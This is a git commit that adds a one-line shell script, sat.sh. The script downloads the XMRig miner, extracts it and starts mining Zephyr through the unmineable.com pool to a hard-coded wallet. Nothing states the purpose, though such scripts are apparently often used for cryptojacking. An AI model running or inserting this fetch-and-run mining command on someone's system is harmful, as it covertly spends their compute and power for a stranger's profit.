34b8e9525ebc9e885b3f38fd957596f01329fccf
sathish2449 <153977503+sathish2449@users.noreply.github.com>
2023-12-16 16:33:59 +0530

    Create sat.sh

---
+++ sat.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -a rx -o rx.unmineable.com:443 -u ZEPH:ZEPHYR3DpwX9RqCCN1Nwy55hruPEW7MKgZw3KmizuwrnUmLaEiQ4tgg1yVUkAPHP6m1Y5VDBgqU1WbBKBgL7NPpmgXicGuFGR8h3K.unmineable_worker_zzdnilrn#40gw-st0b -p x
